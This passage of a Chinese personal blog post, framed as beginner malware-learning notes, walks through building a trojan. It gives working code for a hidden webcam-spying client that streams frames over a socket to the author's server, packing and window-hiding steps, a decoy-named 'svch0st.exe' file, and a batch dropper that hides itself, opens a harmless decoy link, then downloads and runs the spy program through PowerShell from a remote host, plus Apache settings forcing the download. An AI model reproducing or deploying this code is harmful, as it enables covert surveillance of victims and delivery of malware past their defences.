# 工作目录</span><br><span class="line">    # env=None,                # 环境变量</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 等待进程完成（可选）</span><br><span class="line"># process.wait()</span><br></pre></td></tr></table></figure>
+
+<p><strong>cmd的参数表</strong></p>
+<table>
+<thead>
+<tr>
+<th><code>/c</code></th>
+<th>执行指定命令后立即退出 cmd 窗口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/k</code></td>
+<td>执行指定命令但不退出 cmd 窗口，保持命令提示符打开</td>
+</tr>
+<tr>
+<td><code>/s</code></td>
+<td>修改命令行处理方式，通常与<code>/c</code>或<code>/k</code>结合使用</td>
+</tr>
+<tr>
+<td><code>/q</code></td>
+<td>关闭回显功能，不显示命令执行过程</td>
+</tr>
+<tr>
+<td><code>/d</code></td>
+<td>启动时跳过执行<code>AutoRun</code>注册表项中的命令</td>
+</tr>
+<tr>
+<td><code>/a</code></td>
+<td>设置输出到控制台的文本为 ANSI 字符集</td>
+</tr>
+<tr>
+<td><code>/u</code></td>
+<td>设置输出到控制台的文本为 Unicode 字符集</td>
+</tr>
+<tr>
+<td><code>/t:fg</code></td>
+<td>设置命令提示符窗口的前景色 (f) 和背景色 (g)，如<code>/t:0A</code>表示黑底绿字</td>
+</tr>
+<tr>
+<td><code>/e:on</code></td>
+<td>启用命令扩展功能（默认启用）</td>
+</tr>
+<tr>
+<td><code>/e:off</code></td>
+<td>禁用命令扩展功能</td>
+</tr>
+<tr>
+<td><code>/f:on</code></td>
+<td>启用文件名完成功能</td>
+</tr>
+<tr>
+<td><code>/f:off</code></td>
+<td>禁用文件名完成功能</td>
+</tr>
+<tr>
+<td><code>/v:on</code></td>
+<td>启用延迟环境变量扩展</td>
+</tr>
+<tr>
+<td><code>/v:off</code></td>
+<td>禁用延迟环境变量扩展</td>
+</tr>
+</tbody></table>
+<h3 id="弹出计算器"><a href="#弹出计算器" class="headerlink" title="弹出计算器"></a>弹出计算器</h3><p>终端其中计算器的指令是calc.exe，我们把开启子进程写成一个函数实现弹出计算器，证明可以打开终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def startprocess(content):</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, content],  # 命令参数列表</span><br><span class="line">        # 其他可选参数：</span><br><span class="line">        # stdout=subprocess.PIPE,  # 捕获标准输出</span><br><span class="line">        # stderr=subprocess.PIPE,  # 捕获错误输出</span><br><span class="line">        # shell=True,              # 是否使用shell执行</span><br><span class="line">        # cwd=None,                # 工作目录</span><br><span class="line">        # env=None,                # 环境变量</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # 等待进程完成（可选）</span><br><span class="line">    process.wait()</span><br><span class="line"></span><br><span class="line">startprocess(&#x27;calc.exe&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出</p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611220302800.png" alt="image-20250611220302800"></p>
+<h3 id="创建可执行文件"><a href="#创建可执行文件" class="headerlink" title="创建可执行文件"></a>创建可执行文件</h3><p>我们尝试使用终端创建一个可执行文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_file_cmd = &#x27;echo &quot;MZ&quot; &gt; C:\\svch0st.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>借鉴为windows执行的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_creat=&#x27;echo MZ &gt; C:\svch0st.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def startprocess(content):</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, content],  # 命令参数列表</span><br><span class="line">        # 其他可选参数：</span><br><span class="line">        # stdout=subprocess.PIPE,  # 捕获标准输出</span><br><span class="line">        stderr=subprocess.PIPE,  # 捕获错误输出</span><br><span class="line">        # shell=True,              # 是否使用shell执行</span><br><span class="line">        # cwd=None,                # 工作目录</span><br><span class="line">        # env=None,                # 环境变量</span><br><span class="line">    )</span><br><span class="line">    # 等待进程完成（可选）</span><br><span class="line">    stderr=process.wait()</span><br><span class="line">    return stderr</span><br><span class="line">file_creat=&quot;echo &#x27;MZ&#x27; &gt; G:\svch0st.exe&quot;</span><br><span class="line">err=startprocess(file_creat)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611221733564.png" alt="image-20250611221733564"></p>
+<p>成功创建（我没有放在c盘因为c盘需要管理员模式，我直接在ide运行就没用管理员模式）</p>
+<h3 id="监控软件"><a href="#监控软件" class="headerlink" title="监控软件"></a>监控软件</h3><p>由于笔者的基础比较薄弱，所以选择只写一个最简单的监控程序，实现可以打开对方摄像头并将数据使用套接字传输过来的功能就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">def capture_and_send(server_address):</span><br><span class="line">    cap = cv2.VideoCapture(0)</span><br><span class="line">    if not cap.isOpened():</span><br><span class="line">        print(&quot;无法打开摄像头&quot;)</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        client_socket.connect(server_address)</span><br><span class="line">        print(f&quot;已连接到服务器 &#123;server_address&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            ret, frame = cap.read()</span><br><span class="line">            if not ret:</span><br><span class="line">                print(&quot;无法获取视频帧&quot;)</span><br><span class="line">                break</span><br><span class="line">            # 编码图像</span><br><span class="line">            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]</span><br><span class="line">            _, frame_encoded = cv2.imencode(&#x27;.jpg&#x27;, frame, encode_param)</span><br><span class="line">            string_data = frame_encoded.tobytes()</span><br><span class="line">            # 修复1: 使用固定4字节长度头</span><br><span class="line">            header = struct.pack(&quot;!I&quot;, len(string_data))</span><br><span class="line">            # 修复2: 合并发送避免TCP分片问题</span><br><span class="line">            client_socket.sendall(header + string_data)</span><br><span class="line">            # 可选: 本地预览</span><br><span class="line">            # cv2.imshow(&#x27;Local Preview&#x27;, frame)</span><br><span class="line">            if cv2.waitKey(1) &amp; 0xFF == ord(&#x27;q&#x27;):</span><br><span class="line">                break</span><br><span class="line">                </span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;连接错误: &#123;e&#125;&quot;)</span><br><span class="line">    finally:</span><br><span class="line">        client_socket.close()</span><br><span class="line">        cap.release()</span><br><span class="line">        cv2.destroyAllWindows()</span><br><span class="line">        print(&quot;连接已关闭&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server_ip = &#x27;&#x27;  # 替换为服务器实际IP</span><br><span class="line">    capture_and_send((server_ip, 8001))</span><br></pre></td></tr></table></figure>
+
+<p>这个代码是笔者配合LLM写的，其中要注意的是如果没有有公网ip的服务器进行端口转发的话，这个代码就只能在局域网中有效，因为一个子网的ip不能直接访问另一个子网ip，但是子网能访问公网，所以我们通过客户端将数据传输到公网的服务器上，再由公网上的服务器将数据传输到我们的服务端上，具体的实现我是使用阿里云的服务器，用的Xshell进行ssh连接，服务器和服务端的连接我使用的是openVPN</p>
+<p>使用pyarmor加密脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyarmor gen --pack=onefile client.py</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>--pack=onefile</code>：告诉 PyArmor 准备 PyInstaller 单文件打包。</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250614213846572.png" alt="image-20250614213846572"></p>
+<p>使用editbin.exe将文件设为无窗口</p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250614214015683.png" alt="image-20250614214015683"></p>
+<h3 id="木马实现"><a href="#木马实现" class="headerlink" title="木马实现"></a>木马实现</h3><p>开始我想就用python实现部署，但是由于使用的是python打包所以程序是相当的大</p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250615124150376.png" alt="image-20250615124150376"></p>
+<p>那要怎么实现缩小呢</p>
+<p>这时候我想起了在吾爱破解上的文章<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-2035784-1-1.html">论黑客如何从bat到py到donut到ps1层层包裹木马，揭秘木马神秘运行流程 - 吾爱破解 - 52pojie.cn</a>这个大佬分析的病毒样本就是通过批处理文件实现打开一个无害链接作为混淆，然后再链接远程服务器实现下载运行病毒文件，目前我基础比薄弱就只能写一个比较简单的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">if &quot;%1&quot; neq &quot;hidden&quot; (</span><br><span class="line">    powershell -windowstyle hidden -command &quot;Start-Process cmd -ArgumentList &#x27;/c \&quot;%~f0\&quot; hidden&#x27; -Windowstyle Hidden&quot;</span><br><span class="line">    exit</span><br><span class="line">)::首次启动：由于没有参数，脚本会通过 PowerShell 启动一个隐藏的命令提示符窗口，并且给它传递hidden参数，随后当前的可见窗口就会退出。当带有hidden参数启动脚本时，条件判断不成立，脚本会正常执行后续命令，而此时窗口是隐藏的。</span><br><span class="line">@echo off</span><br><span class="line">set &quot;pdfurl=https://blog.csdn.net/hanmo22357/article/details/127883179?ops_request_misc=%257B%2522request%255Fid%2522%253A%25227736a8fc7773cc256f8c17c470a8493a%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=7736a8fc7773cc256f8c17c470a8493a&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127883179-null-null.142^v102^pc_search_result_base4&amp;utm_term=%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80&amp;spm=1018.2226.3001.4187&quot;::设置一个无害链接</span><br><span class="line">start &quot;&quot; &quot;%pdfurl%&quot;::打开</span><br><span class="line">@echo off</span><br><span class="line">powershell -Command &quot;Invoke-WebRequest -Uri &#x27;http://ip/downloads/XML_8d5a90c8e1f47893a4b2.html.exe&#x27; -OutFile &#x27;%~dp0XML_8d5a90c8e1f47893a4b2.html.exe&#x27;&quot;::设置一个监控软件下载链接，并下载到当前目录</span><br><span class="line">if exist &quot;%~dp0XML_8d5a90c8e1f47893a4b2.html.exe&quot; (</span><br><span class="line">    echo y</span><br><span class="line">    start &quot;&quot; &quot;%~dp0XML_8d5a90c8e1f47893a4b2.html.exe&quot;::执行</span><br><span class="line">) else (</span><br><span class="line">    echo n</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>下载链接我是通过apche搭了一个网站，并设置了一个强制下载的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot /var/www/html</span><br><span class="line"></span><br><span class="line">    Alias /downloads &quot;/var/www/downloads&quot;</span><br><span class="line">    &lt;Directory &quot;/var/www/downloads&quot;&gt;</span><br><span class="line">        Options -Indexes</span><br><span class="line">        Require all granted</span><br><span class="line">        # 强制所有文件作为附件下载</span><br><span class="line">        Header always set Content-Disposition &quot;attachment&quot;</span><br><span class="line">        # 强制所有文件视为二进制</span><br><span class="line">        ForceType application/octet-stream</span><br><span class="line">        # 禁用内容压缩</span><br><span class="line">        SetEnv no-gzip 1</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line">&lt;/VirtualHost&gt;                  </span><br></pre></td></tr></table></figure>
+
+<h3 id="最终实现"><a href="#最终实现" class="headerlink" title="最终实现"></a>最终实现</h3><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250615125433200.png" alt="image-20250615125433200"></p>
+<p>这个是病毒本体</p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250615125458044.png" alt="image-20250615125458044"></p>
+<p>这个是被下载的监控软件（我使用ResourceHacker.exe，感谢苦瓜甘甜(wszjf) 师傅的分享这里附上链接<a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1850851&highlight=Resource+Hacker%EF%BC%89%E6%8D%A2%E4%BA%86%E4%B8%80%E4%B8%AA%E5%9B%BE%E6%A0%87%EF%BC%8C%E8%B5%B7%E4%BA%86%E4%B8%80%E4%B8%AA%E4%B8%8D%E6%98%AF%E5%BE%88%E6%98%8E%E6%98%BE%E7%9A%84%E5%90%8D%E5%AD%97">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1850851&amp;highlight=Resource%2BHacker）换了一个图标，起了一个不是很明显的名字</a></p>
+<p>执行流程</p>
+<p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250615130652133.png" alt="image-20250615130652133"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个木马从开始写到写出来还是断断续续写了有几天，中途也有很多不了解的知识去学习，还有很多功能也没加，比如说会报病毒警告啊，没有做持久化啊，摄像头开启灯会亮等等，还是学的有点浅，以后会优化，还有我觉得好的地方就是软件的下载的运行全是在后台，因为是主动发数据所以不会触发防火墙</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=2024403&highlight=%C4%BE%EF%BF%BD%EF%BF%BD">【病毒分析】定向财务的钓鱼木马分析 - 吾爱破解 - 52pojie.cn</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73552988/article/details/147376815?ops_request_misc=%7B%22request_id%22:%222df5a9dd906120c46033a04eb2f51d89%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=2df5a9dd906120c46033a04eb2f51d89&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-147376815-null-null.142%5Ev102%5Epc_search_result_base4&utm_term=%E6%B3%A8%E5%86%8C%E8%A1%A8&spm=1018.2226.3001.4187">详解Windows（五）——注册表_windows注册表-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=2024570&extra=page=1&filter=typeid&typeid=62">【逆向复现】PyInstaller简单复现 - 吾爱破解 - 52pojie.cn</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-2035784-1-1.html">论黑客如何从bat到py到donut到ps1层层包裹木马，揭秘木马神秘运行流程 - 吾爱破解 - 52pojie.cn</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">GoodBrain</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/15/re/0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">http://example.com/2025/06/15/re/0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">G00DBrain blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><a class="post-meta__tags" href="/tags/%E7%97%85%E6%AF%92/">病毒</a></div><div class="post-share"><div class="social-share" data-image="https://raw.githubusercontent.com/likunvs/images/main/images/96690cdf789a73f71e2908bee479484.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/06/04/%E7%BC%96%E7%A8%8B/kotlin%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="kotlin语言学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">kotlin语言学习</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/likunvs/images/main/images/96690cdf789a73f71e2908bee479484.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">GoodBrain</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="/lkh_258@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">文章插图需搭梯子</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-text">0基础入门病毒学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B"><span class="toc-text">病毒检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87%E5%BC%80%E5%A7%8B"><span class="toc-text">正文开始</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B"><span class="toc-text">开始</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-text">注册表</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8A%E6%94%BE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">释放配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8A%E6%94%BE%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F"><span class="toc-text">释放控制程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F"><span class="toc-text">执行控制程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E7%97%95%E8%BF%B9"><span class="toc-text">清除痕迹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E6%84%9F%E6%82%9F"><span class="toc-text">个人感悟</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B-1"><span class="toc-text">开始</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E7%BB%88%E7%AB%AF"><span class="toc-text">打开终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-text">弹出计算器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-text">创建可执行文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E6%8E%A7%E8%BD%AF%E4%BB%B6"><span class="toc-text">监控软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-text">木马实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E5%AE%9E%E7%8E%B0"><span class="toc-text">最终实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/15/re/0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="0基础入门病毒学习笔记">0基础入门病毒学习笔记</a><time datetime="2025-06-15T05:29:40.000Z" title="发表于 2025-06-15 13:29:40">2025-06-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/04/%E7%BC%96%E7%A8%8B/kotlin%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="kotlin语言学习">kotlin语言学习</a><time datetime="2025-06-04T14:10:01.185Z" title="发表于 2025-06-04 22:10:01">2025-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/12/web/PHP%E4%BA%86%E8%A7%A3/" title="PHP了解">PHP了解</a><time datetime="2025-05-12T03:38:07.027Z" title="发表于 2025-05-12 11:38:07">2025-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/ARM%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/" title="ARM汇编语言学习笔记">ARM汇编语言学习笔记</a><time datetime="2025-05-11T16:00:00.000Z" title="发表于 2025-05-12 00:00:00">2025-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/17/web/HTTP%E5%AD%A6%E4%B9%A0/" title="HTTP协议学习笔记">HTTP协议学习笔记</a><time datetime="2025-04-17T14:12:12.740Z" title="发表于 2025-04-17 22:12:12">2025-04-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: rgba(0, 0, 0, 0);"><div id="footer-wrap"><div class="copyright">&copy;2025 By GoodBrain</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
